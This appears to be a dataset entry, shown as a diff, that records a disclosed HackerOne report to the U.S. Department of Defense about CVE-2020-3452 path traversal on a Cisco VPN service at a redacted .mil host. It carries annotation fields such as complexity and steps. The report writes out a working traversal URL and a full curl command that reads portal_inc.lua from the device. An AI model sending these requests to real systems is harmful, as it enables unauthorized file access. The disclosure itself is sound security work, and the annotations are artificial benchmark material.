@@ -1,0 +1,38 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "arm4nd0 ",
+  "title": "[\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil] Cisco VPN Service Path Traversal",
+  "content": "\nHi team.\n\u00a0\n# Summary\nThe Cisco VPN Service at \u2588\u2588\u2588\u2588\u2588\u2588.mil is vulnerable to the CVE-2020-3452 vulnerability, which allows path traversing within the web service's file system on the targeted device.\n\u00a0\n# Steps to Reproduce\nMake a GET request to:\nCode 119 Bytes\n1https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../\ncURL command:\nCode 635 Bytes\n1curl -i -s -k -X $'GET' \\\n2    -H $'Host: \u2588\u2588\u2588\u2588\u2588.mil' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://\u2588\u2588\u2588\u2588\u2588.mil/+CSCOE+/logon.html?fcadbadd=1' -H $'DNT: 1' -H $'Connection: close' -H $'Cookie: webvpnlogin=1; webvpnLang=en' -H $'Upgrade-Insecure-Requests: 1' \\\n3    -b $'webvpnlogin=1; webvpnLang=en' \\\n4    $'https://\u2588\u2588\u2588.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'\n..and get the content of the portal_inc.lua file.\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n\u00a0\nImpact\nAccording to Cisco, this vulnerability cannot be used to obtain access to ASA or FTD system files or underlying operating system (OS) files, however, it has a CVE 7.5 (High) score.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Path Traversal"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1602892080,
+  "report_url": "https://hackerone.com/reports/943717",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Make a GET request to the vulnerable endpoint: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588.mil/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
+    ],
+    [
+      2,
+      "Use a tool like cURL to send the request and retrieve the content of the portal_inc.lua file"
+    ]
+  ],
+  "vuln_description": "The Cisco VPN Service at \u2588\u2588\u2588\u2588\u2588\u2588.mil is vulnerable to CVE-2020-3452, a path traversal vulnerability that allows an attacker to access files within the web service's file system on the targeted device.",
+  "reason": "The vulnerability involves a straightforward path traversal attack with no complex interactions or state manipulations. The attack is well-documented and uses a known CVE, making it relatively easy to discover and exploit.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null
+}
